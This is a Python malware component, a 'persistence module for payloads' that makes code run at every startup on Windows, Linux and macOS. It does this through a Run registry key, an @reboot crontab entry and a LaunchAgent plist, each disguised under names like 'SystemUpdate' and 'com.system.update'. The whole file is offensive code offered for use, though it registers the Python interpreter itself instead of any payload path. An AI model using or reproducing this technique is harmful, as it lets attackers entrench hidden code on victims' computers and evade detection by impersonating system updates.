#!/usr/bin/env python3
"""
Persistence module for payloads
Ensures payload runs on startup
"""

import os
import sys
import platform
import shutil

def add_persistence():
    """Add persistence based on OS"""
    system = platform.system()
    
    if system == 'Windows':
        # Windows registry persistence
        import winreg
        
        key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SystemUpdate', 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        
    elif system == 'Linux':
        # Linux crontab persistence
        import subprocess
        
        cron_line = f'@reboot {sys.executable}'
        subprocess.run(f'(crontab -l; echo "{cron_line}") | crontab -', shell=True)
        
    elif system == 'Darwin':  # macOS
        # macOS LaunchAgent
        plist_path = os.path.expanduser('~/Library/LaunchAgents/com.system.update.plist')
        
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
        
        with open(plist_path, 'w') as f:
            f.write(plist_content)
            
    return True

if __name__ == "__main__":
    add_persistence()
